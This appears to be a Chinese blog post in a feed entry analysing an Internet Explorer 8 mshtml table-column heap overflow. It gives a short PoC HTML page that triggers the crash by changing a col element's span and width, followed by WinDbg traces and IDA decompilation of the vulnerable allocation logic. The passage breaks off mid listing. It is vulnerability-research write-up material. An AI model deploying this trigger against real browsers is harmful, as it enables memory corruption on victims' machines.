        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><blockquote><p>第一次接触ctf外的漏洞，跟着各个师傅的博客和《漏洞战争》折腾了好几天，也终于算是成功了。在这里记录一下自己整个调试过程，做个总结。<br><a id="more"></a></p></blockquote><p><img src="/post/b72ee585/pwn.gif" alt="pwn.gif"></p><h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul><li>windows7 32位(IE版本: 8.0.7600.16385)</li><li>windbg</li><li>Immunity Debugger</li></ul><h1 id="POC调试"><a href="#POC调试" class="headerlink" title="POC调试"></a>POC调试</h1><p><strong>poc代码：</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"1"</span> &gt;</span>&amp;nbsp;<span class="tag">&lt;/<span class="name">col</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">over_trigger</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> obj_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span></span><br><span class="line"><span class="javascript">obj_col.width = <span class="string">"42765"</span>;</span></span><br><span class="line"><span class="undefined">obj_col.span = 1000;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="string">"over_trigger();"</span>,<span class="number">1</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><h2 id="基于HPA的漏洞分析方法"><a href="#基于HPA的漏洞分析方法" class="headerlink" title="基于HPA的漏洞分析方法"></a>基于HPA的漏洞分析方法</h2><p>首先用<code>gflag.exe</code>对IE进程开启hpa选项(gflag.exe位于windbg文件夹下)：</p><blockquote><p><code>gflag.exe -i iexplore.exe +hpa</code></p></blockquote><p>用IE打开poc.html，然后使用windbg对进程进行attach。此处注意选择位置靠下的一个进程。<br><img src="/post/b72ee585/attach.png" alt="attach.png"></p><p>然后命令g，继续运行。在浏览器中允许阻止的内容。<br>然后就可以发现windbg断下了<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">(644.3a8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000009 ebx=00001482 ecx=00010689 edx=00000014 esi=08128000 edi=08128018</span><br><span class="line">eip=6ad1f167 esp=045edf08 ebp=045edf14 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+0x15:</span><br><span class="line">6ad1f167 890f            mov     dword ptr [edi],ecx  ds:0023:08128018=????????</span><br><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">045edf14 6ab95b8e 00001482 045ee258 00000001 mshtml!CTableColCalc::AdjustForCol+0x15</span><br><span class="line">045edfc4 6aa00713 00000001 045ee258 000003e8 mshtml!CTableLayout::CalculateMinMax+0x52f</span><br><span class="line">045ee1e0 6a9eaf19 045ee258 045ee224 00000001 mshtml!CTableLayout::CalculateLayout+0x276</span><br><span class="line">045ee38c 6aadcc48 045efa00 045ee5b8 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720</span><br><span class="line">045ee4c4 6aacf5d0 04d00ea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class="line">045ee588 6aacf31d 04d00ea8 00016747 00016747 mshtml!CFlowLayout::MeasureSite+0x312</span><br><span class="line">045ee5d0 6aacf664 09330f00 00000061 045efa00 mshtml!CFlowLayout::GetSiteWidth+0x156</span><br><span class="line">045ee610 6aacfb40 09224fb0 04d00ea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce</span><br><span class="line">045ee694 6eef665d 09244ff8 045ee6b4 045ee778 mshtml!CEmbeddedILSObj::Fmt+0x150</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p></p><p>可以看到，是由于<code>edi</code>中储存了一个非法地址而造成的崩溃<br>通过汇编代码往上回溯，发现edi的值来自于<code>[esi+0x18]</code>，而在当前函数中没有esi的处理代码，所以往上层函数看，定位到<code>mshtml!CTableLayout::CalculateMinMax</code>，在此处下上断点，重新attach调试。<br>因为下断点前要确保所在模块已经被加载，所以可以通过<code>sxe ld:mshtml</code>让程序在加载<code>mshtml</code>后断下，然后再下断点<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; lmm mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">6afb0000 6b562000   mshtml     (pdb symbols)          C:\Users\hgy\Desktop\WinDbg\x86\sym\mshtml.pdb\5B825981E9B445BBB998A27119FF0D6E2\mshtml.pdb</span><br><span class="line">0:013&gt; bp mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">0:013&gt; bl</span><br><span class="line"> 0 e 6b0c018a     0001 (0001)  0:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">0:013&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=08251ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=045ee604</span><br><span class="line">eip=6b0c018a esp=045ee3a8 ebp=045ee5c0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">6b0c018a 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure><p></p><p>继续单步执行：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; p</span><br><span class="line">eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4</span><br><span class="line">eip=6878018c esp=0462e288 ebp=0462e4a0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x2:</span><br><span class="line">6878018c 55              push    ebp</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4</span><br><span class="line">eip=6878018d esp=0462e284 ebp=0462e4a0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x3:</span><br><span class="line">6878018d 8bec            mov     ebp,esp</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4</span><br><span class="line">eip=6878018f esp=0462e284 ebp=0462e284 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x5:</span><br><span class="line">6878018f 81ec90000000    sub     esp,90h</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4</span><br><span class="line">eip=68780195 esp=0462e1f4 ebp=0462e284 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xb:</span><br><span class="line">68780195 53              push    ebx</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4</span><br><span class="line">eip=68780196 esp=0462e1f0 ebp=0462e284 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xc:</span><br><span class="line">68780196 8b5d08          mov     ebx,dword ptr [ebp+8] ss:0023:0462e28c=05f8cea8</span><br><span class="line">0:005&gt; dd poi(ebp+8)</span><br><span class="line">05f8cea8  68679868 0562cf30 05f7efb8 68834918</span><br><span class="line">05f8ceb8  00000001 00000000 0108080d ffffffff</span><br><span class="line">05f8cec8  00000000 00000000 00000000 ffffffff</span><br><span class="line">05f8ced8  00016747 00009d9e 00000000 00000000</span><br><span class="line">05f8cee8  00000000 00412802 00000000 00000000</span><br><span class="line">05f8cef8  00000000 00000001 ffffffff ffffffff</span><br><span class="line">05f8cf08  ffffffff ffffffff 68679fd0 00000004</span><br><span class="line">05f8cf18  00000004 08c50ff0 68679fd0 00000004</span><br><span class="line">0:005&gt; ln 68679868 </span><br><span class="line">(68679868)   mshtml!CTableLayout::`vftable&apos;   |  (686799a8)   mshtml!CTableLayoutBlock::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure><p></p><p>我们知道，<code>ebp+8</code>是函数的第一个参数值，《漏洞战争》中指出该参数是<code>CTableLayout</code>对象指正，也就是&lt;table>标签在内存中的对象。<br>通过配合IDA加载符号信息也可得出该结论:<br><code>void __thiscall CTableLayout::CalculateMinMax(CTableLayout *this, struct CTableCalcInfo *a2, int a3, int a4)</code></p><p>继续单步<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; p</span><br><span class="line">eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4</span><br><span class="line">eip=68780199 esp=0462e1f0 ebp=0462e284 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xf:</span><br><span class="line">68780199 56              push    esi</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4</span><br><span class="line">eip=6878019a esp=0462e1ec ebp=0462e284 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x10:</span><br><span class="line">6878019a 8b750c          mov     esi,dword ptr [ebp+0Ch] ss:0023:0462e290=0462e518</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4</span><br><span class="line">eip=6878019d esp=0462e1ec ebp=0462e284 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x13:</span><br><span class="line">6878019d 8b4628          mov     eax,dword ptr [esi+28h] ds:0023:0462e540=00000000</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4</span><br><span class="line">eip=687801a0 esp=0462e1ec ebp=0462e284 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x16:</span><br><span class="line">687801a0 898574ffffff    mov     dword ptr [ebp-8Ch],eax ss:0023:0462e1f8=01171000</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4</span><br><span class="line">eip=687801a6 esp=0462e1ec ebp=0462e284 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1c:</span><br><span class="line">687801a6 8b4354          mov     eax,dword ptr [ebx+54h] ds:0023:05f8cefc=00000001</span><br></pre></td></tr></table></figure><p></p><p>可以看到在<code>ebx+0x54</code>处储存的值为1，《漏洞战争》中指出此处即为POC中col标签的span值，记作<code>spannum</code>。<br>继续往下执行，同时配合IDA查看<code>CalculateMinMax</code>函数<br>有这么一段指令：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">687802cc 8b8394000000    mov     eax,dword ptr [ebx+94h] ; 取出spancmp</span><br><span class="line">687802d2 c1e802          shr     eax,2</span><br><span class="line">687802d5 3bc2            cmp     eax,edx ; 将spannum值与spancmp/2比较</span><br><span class="line">687802d7 7d39            jge     mshtml!CTableLayout::CalculateMinMax+0x1fa (68780312)</span><br><span class="line">687802d9 3bd7            cmp     edx,edi</span><br><span class="line">687802db 8db390000000    lea     esi,[ebx+90h]</span><br><span class="line">687802e1 0f8c9bcbefff    jl      mshtml!CTableLayout::CalculateMinMax+0x1da (6867ce82)</span><br><span class="line">687802e7 3b5608          cmp     edx,dword ptr [esi+8]</span><br><span class="line">687802ea 7613            jbe     mshtml!CTableLayout::CalculateMinMax+0x1e7 (687802ff)</span><br><span class="line">687802ec 6a1c            push    1Ch</span><br><span class="line">687802ee 8bc2            mov     eax,edx</span><br><span class="line">687802f0 8bfe            mov     edi,esi</span><br><span class="line">687802f2 e8c08c0c00      call    mshtml!CImplAry::EnsureSizeWorker (68848fb7)</span><br><span class="line"></span><br><span class="line">0:005&gt; ga 687802cc </span><br><span class="line">eax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000</span><br><span class="line">eip=687802cc esp=0462e1e8 ebp=0462e284 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1b1:</span><br><span class="line">687802cc 8b8394000000    mov     eax,dword ptr [ebx+94h] ds:0023:05f8cf3c=00000000</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000</span><br><span class="line">eip=687802d2 esp=0462e1e8 ebp=0462e284 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1b7:</span><br><span class="line">687802d2 c1e802          shr     eax,2</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000</span><br><span class="line">eip=687802d5 esp=0462e1e8 ebp=0462e284 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1ba:</span><br><span class="line">687802d5 3bc2            cmp     eax,edx</span><br></pre></td></tr></table></figure><p></p><p>可以看到程序获取了一个spancmp值，除以2之后与spannum比较，若<code>spannum &lt;= spancmp/4</code>则<strong>跳转</strong>。<br>此时<code>spannum == 1</code>、<code>spancmp/4 == 0</code><br>所以不会发生跳转，程序继续往后执行直到<code>call mshtml!CImplAry::EnsureSizeWorker</code><br>IDA反编译的函数参数为<code>CImplAry::EnsureSizeWorker(v43, v157, (int)v37 + 0x90, 0x1Cu, (int)v125);</code><br>跟进该函数（IDA）:<br></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __userpurge CImplAry::EnsureSizeWorker@&lt;eax&gt;(CImplAry *<span class="keyword">this</span>@&lt;ecx&gt;, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2@&lt;eax&gt;, <span class="keyword">int</span> a3@&lt;edi&gt;, <span class="keyword">unsigned</span> <span class="keyword">int</span> MaxCount, <span class="keyword">int</span> a5)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//MaxCount == 0x1C</span></span><br><span class="line">  <span class="comment">//a2 == spannum</span></span><br><span class="line">  ...</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v14 = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = ULongAdd(*(_DWORD *)(a3 + <span class="number">8</span>), *(_DWORD *)(a3 + <span class="number">8</span>) &gt;&gt; <span class="number">1</span>, &amp;v14);</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">        <span class="keyword">return</span> v6;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; v14 )</span><br><span class="line">        v14 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = ULongLongToUInt(&amp;dwBytes, MaxCount * (<span class="keyword">unsigned</span> __int64)v14, v11);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a3 + <span class="number">4</span>) &amp; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ...<span class="comment">//不会进入此处</span></span><br><span class="line">    &#125;</span><br><span class="line">    v6 = _HeapRealloc((LPVOID *)(a3 + <span class="number">12</span>), dwBytes, v12);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>其中ULongLongToInt的功能为:<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> MaxCount*v14 &gt; <span class="number">0xFFFFFFFF</span>，dwBytes = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">else</span> dwBytes = MaxCount*v14;</span><br></pre></td></tr></table></figure><p></p><p>分析后可以得知，该函数将会通过<code>_HeapRealloc()</code>来申请一个堆空间，<code>dwBytes</code>为该空间的大小。<br>同时<code>dwBytes = (spannum &gt; 4 ? spannum : 4) * 0x1c</code><br>因为我们的<code>spannum == 1</code>，所以将会分配<code>4*0x1c == 0x70</code>大小的空间</p><p>观察<code>_HeapRealloc</code>函数，可知分配的空间地址将会被<code>esi</code>引用。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; p</span><br><span class="line">eax=00000000 ebx=00000000 ecx=00000070 edx=00000000 esi=088faf44 edi=088faf38</span><br><span class="line">eip=68d38ff6 esp=0460e040 ebp=0460e054 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CImplAry::EnsureSizeWorker+0x9c:</span><br><span class="line">68d38ff6 e86edcfdff      call    mshtml!_HeapRealloc (68d16c69)</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000000 ebx=00000000 ecx=77bc349f edx=00000000 esi=088faf44 edi=088faf38</span><br><span class="line">eip=68d38ffb esp=0460e044 ebp=0460e054 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CImplAry::EnsureSizeWorker+0xa1:</span><br><span class="line">68d38ffb 8bd8            mov     ebx,eax</span><br><span class="line">0:005&gt; dd poi(esi)</span><br><span class="line">08c76f90  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">08c76fa0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">08c76fb0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">08c76fc0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">08c76fd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">08c76fe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">08c76ff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">08c77000  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure><p></p><blockquote><p>注意，关闭了hpa后，堆内存不会被初始化为0xc0。后面建议关闭hpa</p></blockquote><p>保持<code>mshtml!CTableLayout::CalculateMinMax</code>处的断点，让程序继续运行，再次在该函数断下。<br>往后运行到spannum与spancmp比较处:<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00000000 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000</span><br><span class="line">eip=68c702cc esp=0460d878 ebp=0460d914 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1b1:</span><br><span class="line">68c702cc 8b8394000000    mov     eax,dword ptr [ebx+94h] ds:0023:088faf3c=00000004</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000004 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000</span><br><span class="line">eip=68c702d2 esp=0460d878 ebp=0460d914 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1b7:</span><br><span class="line">68c702d2 c1e802          shr     eax,2</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000</span><br><span class="line">eip=68c702d5 esp=0460d878 ebp=0460d914 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1ba:</span><br><span class="line">68c702d5 3bc2            cmp     eax,edx</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000</span><br><span class="line">eip=68c702d7 esp=0460d878 ebp=0460d914 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1bc:</span><br><span class="line">68c702d7 7d39            jge     mshtml!CTableLayout::CalculateMinMax+0x1fa (68c70312) [br=1]</span><br></pre></td></tr></table></figure><p></p><p>发现<code>spancmp == 4</code>、<code>spannum == 1</code><br>此时<code>spancmp/4 == spannum</code>，将会发生跳转，意味着不会再执行<code>CImplAry::EnsureSizeWorker</code>函数。</p><p>然后在获取span值的函数<code>mshtml!CTableCol::GetAAspan</code>下断<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 